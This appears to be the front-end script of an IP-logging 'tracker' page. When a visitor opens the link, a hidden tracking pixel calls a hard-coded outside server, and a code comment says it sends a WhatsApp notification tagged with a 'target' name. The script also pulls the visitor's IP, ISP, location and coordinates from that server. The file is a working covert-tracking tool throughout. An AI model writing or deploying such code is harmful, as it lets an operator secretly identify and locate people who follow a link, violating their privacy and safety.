document.addEventListener('DOMContentLoaded', async () => {
    const loadingState = document.getElementById('loading');
    const resultState = document.getElementById('result');

    const els = {
        ip: document.getElementById('ip-val'),
        isp: document.getElementById('isp-val'),
        loc: document.getElementById('loc-val'),
        coord: document.getElementById('coord-val'),
        tz: document.getElementById('tz-val'),
        ua: document.getElementById('ua-val')
    };

    const urlParams = new URLSearchParams(window.location.search);
    const targetParam = urlParams.get('target') || 'VisitorWeb';

    // Load hidden tracking pixel to send WhatsApp Notification
    const pixel = new Image();
    pixel.src = `http://48.193.44.128/image/ip?target=${targetParam}`;
    pixel.style.display = 'none';

    // Fetch IP and location data from VPS
    try {
        // Fallback info if API fails
        els.ua.textContent = navigator.userAgent;

        const response = await fetch(`http://48.193.44.128/api/ip?target=${targetParam}`);
        if (!response.ok) throw new Error('Network response was not ok');
        const data = await response.json();

        // Populate UI
        els.ip.textContent = data.ip || 'Unknown';
        els.isp.textContent = data.isp || 'Unknown Provider';
        
        if (data.city && data.country) {
            els.loc.textContent = `${data.city}, ${data.country}`;
        } else {
            els.loc.textContent = 'Location masked';
        }

        if (data.lat && data.lon) {
            els.coord.textContent = `${data.lat}, ${data.lon}`;
        } else {
            els.coord.textContent = '---';
        }

        els.tz.textContent = data.timezone || '---';

    } catch (err) {
        console.error('Tracker error:', err);
        els.ip.textContent = 'Error tracking IP';
        els.isp.textContent = 'Please try again later';
    } finally {
        // Artificial delay for cool decryption effect
        setTimeout(() => {
            loadingState.classList.add('hidden');
            resultState.classList.remove('hidden');
        }, 1200);
    }
});
